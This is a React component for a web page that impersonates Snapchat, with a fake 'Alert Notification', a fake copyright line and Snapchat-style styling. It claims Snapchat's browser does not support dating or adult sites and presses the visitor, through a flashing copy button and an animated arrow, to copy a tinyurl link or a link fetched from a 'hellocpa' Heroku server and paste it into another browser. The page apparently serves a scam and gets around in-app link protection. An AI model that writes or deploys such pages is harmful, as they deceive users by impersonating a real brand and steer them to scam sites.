import CopyToClipboard from "react-copy-to-clipboard";
import useSound from 'use-sound';
import boopSfx from './audio/well.mp3';
import {
    useState,
    useEffect
} from 'react';
import axios from "axios";
import './App.css';

function App() {
    const [URL, setURL] = useState("https://tinyurl.com/dateyou3");
    const [hi, setHi] = useState("");

    useEffect(() => {

        axios.post("https://hellocpa.herokuapp.com/", {
            message: "Catherine-Rose"
        }).then((res) => {
            console.log(res.data.message)
            // console.log(res.data.hello)
            setHi(res.data.message)
        })
    }, []);



    const [copy, copied] = useState(false)
    const [btnText, setBtnText] = useState("Copy")
    const [alert, setAlert] = useState("")
    const [play] = useSound(boopSfx);
    const [mtop, setMtop] = useState({
        top: "40px",
        dispaly: "block"
    })
    const [bgcolor, setBgcolor] = useState({
        backgroundColor: "white"
    })
    const [show, setShow] = useState(false)
    const [copybtn, setCopybtn] = useState({
        backgroundColor: "#1da1f2"
    })

    function ControlBTn() {
        setTimeout(() => {
            setCopybtn({
                backgroundColor: "#0f73b1"
            })
        }, 200);
        setTimeout(() => {
            setCopybtn({
                backgroundColor: "#1da1f2"
            })
        }, 400);


        setTimeout(() => {
            ControlBTn()
        }, 600);

    }
    ControlBTn()

    useEffect(() => {
        function x() {
            setTimeout(() => {
                setMtop({
                    top: "40px"
                })
            }, 1000);
            setTimeout(() => {
                setMtop({
                    top: "60px"
                })
            }, 2000);


            setTimeout(() => {
                x()
            }, 3000);
        }
        x()
    }, [])

    function OnCopy() {
        setShow(true)

        setTimeout(() => {
            setShow(false)
        }, 5000)

        function xxx() {
            setTimeout(() => {
                setBgcolor({
                    backgroundColor: "green"
                })
            }, 200);
            setTimeout(() => {
                setBgcolor({
                    backgroundColor: "white"
                })
            }, 400);


            setTimeout(() => {
                xxx()
            }, 600);
        }
        xxx()
        copied(true)
        setAlert("Copied")
        setBtnText("Copied")
        setTimeout(() => {
            setAlert("")
            setBtnText("Copy")

        }, 1000);

        console.log("--------------------")
    }

    return ( <
        div >

        <
        div >

        <
        div >
        <
        div className = "setwidth" >
        <
        div >
        <
        div class = "s1" >
        <
        div className = "s2" >
        <
        img src = "./profile.svg"
        alt = "" / >
        <
        /div> <
        div >
        <
        h2 className = "s3" > Alert Notification < /h2> <
        div className = "s4" >
        <
        p className = "s5" > Snapchat browser is not currentry Supported Dating or Adult Site 's if you want to go the site follow below steps</p> <
        /div> <
        div className = "s6" > < /div> <
        /div> <
        /div> <
        div className = "s7" >
        <
        ul >
        <
        li > Click on the button to copy the url / link from the text field. < /li> <
        div className = "s8" > < /div> <
        li className = "s9" > Try to paste the url / link(e.g ctrl + v) in a different browser of Chrome, Safari, Firefox or Opera etc to Continue < /li> <
        div className = "s8" > < /div> <
        /ul> <
        /div> <
        div >
        <
        div className = ""
        type = "text"
        value = "Jane Doe" >
        <
        /div> <
        div className = "urlbox s10" >
        <
        div className = "url" >
        https: //tinyurl*****

        <
        /div> <
        /div> <
        div className = "s11" >
        <
        div className = "py-2 rel-arrow" >

        <
        CopyToClipboard text = {
            hi || URL
        }
        onCopy = {
            () => OnCopy()
        } >

        <
        button style = {
            copybtn
        }
        onClick = {
            play
        }
        className = "copy-btn" > {
            btnText
        } <
        /button>

        <
        /CopyToClipboard>   <
        img style = {
            mtop
        }
        className = "arrow"
        src = "/arrow.png" / >


        <
        /div> <
        /div> <
        div className = "s12" >
        <
        p > Please use the latest version of Chrome, Opera, Firefox or Safari and etc. < /p> <
        /div> <
        div >
        <
        div className = "s13" >
        <
        div className = "py-2 s14 browser  " >
        <
        div > < img src = "/b-1.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-2.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-3.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-1.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-2.svg"
        alt = "" / > < /div> <
        /div> <
        div className = "browser s15" >
        <
        div > < img src = "/b-4.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-2.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-5.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-3.svg"
        alt = "" / > < /div> <
        div > < img src = "/b-6.svg"
        alt = "" / > < /div> <
        /div> <
        /div> <
        /div> <
        /div> <
        br / >
        <
        br / >
        <
        span className = "s16" > & copy; 2022 Snapchat * Privary Policy * Tems of Service < /span> <
        /div> <
        /div> <
        /div> <
        /div> <
        div className = "copied" >
        <
        div className = "box" >
        <
        h1 className = "done" > {
            alert
        } <
        /h1> <
        /div> <
        /div>

        {
            show && < div className = "message"
            style = {
                    bgcolor
                } >
                Well done, Now
            if want to you
            continue ? paste in a browser. < img style = {
                {
                    height: "15px"
                }
            }
            src = "/audio.png" / >
                <
                /div>}

                <
                /div>


        );
    }

    export default App;